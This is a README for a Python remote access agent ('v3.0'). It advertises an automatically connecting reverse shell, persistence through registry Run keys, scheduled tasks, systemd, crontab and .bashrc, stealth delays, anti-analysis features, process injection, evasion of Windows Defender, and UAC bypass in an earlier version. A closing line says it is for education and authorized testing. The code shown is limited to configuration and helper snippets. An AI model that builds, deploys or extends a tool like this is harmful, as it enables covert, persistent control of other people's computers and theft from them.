# Enhanced Python Agent v3.0 - Autostart + Advanced Error Handling

## Overview

This is an enhanced version of the Python remote access agent that includes:

- **🚀 AUTOSTART**: Automatic connection to the controller without manual intervention
- **🛡️ ADVANCED ERROR HANDLING**: Comprehensive retry mechanisms and graceful degradation
- **🔄 AUTO-RECONNECTION**: Exponential backoff and health monitoring
- **⚡ PERSISTENCE**: Multiple persistence mechanisms for Windows and Linux
- **📊 LOGGING**: Detailed logging and monitoring capabilities

## Key Features

### Autostart Functionality
- Automatically connects to the controller on startup
- No need to manually start the reverse shell
- Intelligent retry with exponential backoff (2s → 300s max)
- Random stealth delays to avoid detection patterns
- Automatic server availability detection

### Advanced Error Handling
- Comprehensive exception handling with stack trace logging
- Retry decorators for critical functions
- Safe execution wrappers for all operations
- Connection state management
- Graceful degradation when services fail

### Persistence Mechanisms

#### Windows:
- Registry Run keys (HKCU and HKLM)
- Startup folder placement
- Scheduled tasks (with admin privileges)
- Autostart batch script with crash recovery

#### Linux:
- Systemd user services
- Crontab entries
- .bashrc modifications
- Autostart shell script with crash recovery

### Health Monitoring
- Continuous connection health checks every 60 seconds
- Automatic reconnection on failure
- Performance monitoring and statistics
- Connection attempt tracking

## Configuration

### Autostart Configuration
```python
AUTOSTART_CONFIG = {
    'enabled': True,                    # Enable/disable autostart
    'max_connection_attempts': 50,      # Maximum retry attempts
    'initial_retry_delay': 2,           # Initial delay between retries
    'max_retry_delay': 300,             # Maximum delay (5 minutes)
    'exponential_backoff_multiplier': 1.5,
    'connection_timeout': 30,           # Connection timeout
    'health_check_interval': 60,        # Health check frequency
    'auto_restart_on_failure': True,    # Auto-restart on errors
    'stealth_delay_range': (1, 5),      # Random delay range
}
```

## Usage

### Starting the Agent
```bash
# The agent will automatically connect to the controller
python python_agent.py
```

### Controller Endpoints

The controller now includes new endpoints for autostart support:

- `POST /register` - Register agent with capabilities
- `GET /status` - Server health check
- `GET /agent/<id>/status` - Agent-specific status

### Logs

The agent creates detailed logs in `agent.log`:
```
2024-01-15 10:30:45,123 - INFO - === ENHANCED AGENT STARTING (v3.0 - Autostart + Error Handling) ===
2024-01-15 10:30:45,234 - INFO - Autostart enabled - attempting automatic connection...
2024-01-15 10:30:47,456 - INFO - ✓ Automatic connection established successfully
2024-01-15 10:30:47,567 - INFO - ✓ Registry persistence (HKCU) established
2024-01-15 10:30:47,678 - INFO - ✓ Startup folder persistence established
2024-01-15 10:30:47,789 - INFO - Health monitoring started
```

## Features Comparison

| Feature | v2.0 (Original) | v3.0 (Enhanced) |
|---------|-----------------|-----------------|
| Manual Start | ✅ | ✅ |
| Autostart | ❌ | ✅ |
| Error Handling | Basic | Advanced |
| Reconnection | Manual | Automatic |
| Health Monitoring | ❌ | ✅ |
| Logging | Print statements | Structured logging |
| Persistence | Single method | Multiple methods |
| Cross-platform | Windows focus | Windows + Linux |
| Graceful Shutdown | ❌ | ✅ |
| Performance Monitoring | ❌ | ✅ |

## Error Handling Examples

### Retry Decorator
```python
@retry_on_failure(max_attempts=3, delay=2, logger_func=logger.warning)
def critical_function():
    # Function will auto-retry on failure
    pass
```

### Safe Execution
```python
# Safely execute functions with error logging
result = safe_execute(risky_function, arg1, arg2)
```

### Connection Management
```python
# Automatic connection state tracking
if connection_manager.connected:
    # Perform operations
    pass
else:
    # Attempt reconnection
    auto_establish_connection()
```

## Security Considerations

- All persistence mechanisms use stealth naming conventions
- Random delays prevent detection patterns
- Comprehensive anti-analysis techniques
- Process hiding and injection capabilities
- Windows Defender evasion

## Troubleshooting

### Common Issues

1. **Connection Failures**
   - Check server URL in `SERVER_URL` variable
   - Verify controller is running on port 8080
   - Check firewall settings

2. **Persistence Not Working**
   - Run as administrator on Windows for full persistence
   - Check logs for specific persistence method failures
   - Verify write permissions to target directories

3. **High CPU Usage**
   - Adjust `health_check_interval` in config
   - Modify retry delays for less aggressive reconnection

### Debug Mode

Enable debug logging:
```python
logging.getLogger().setLevel(logging.DEBUG)
```

## Advanced Usage

### Custom Persistence
You can add custom persistence methods by extending the `setup_persistence()` function.

### Configuration Override
Override autostart configuration at runtime:
```python
AUTOSTART_CONFIG['enabled'] = False  # Disable autostart
AUTOSTART_CONFIG['max_retry_delay'] = 600  # 10 minutes
```

### Manual Health Checks
```python
# Perform manual health check
if not health_monitor._perform_health_check():
    auto_establish_connection()
```

## Version History

- **v3.0**: Added autostart, advanced error handling, health monitoring
- **v2.0**: UACME-inspired UAC bypass techniques
- **v1.0**: Basic remote access functionality

## Requirements

- Python 3.6+
- All dependencies from `requirements.txt`
- Windows: Admin privileges recommended for full functionality
- Linux: User account with appropriate permissions

## License

This tool is for educational and authorized testing purposes only. Use responsibly and in accordance with all applicable laws and regulations.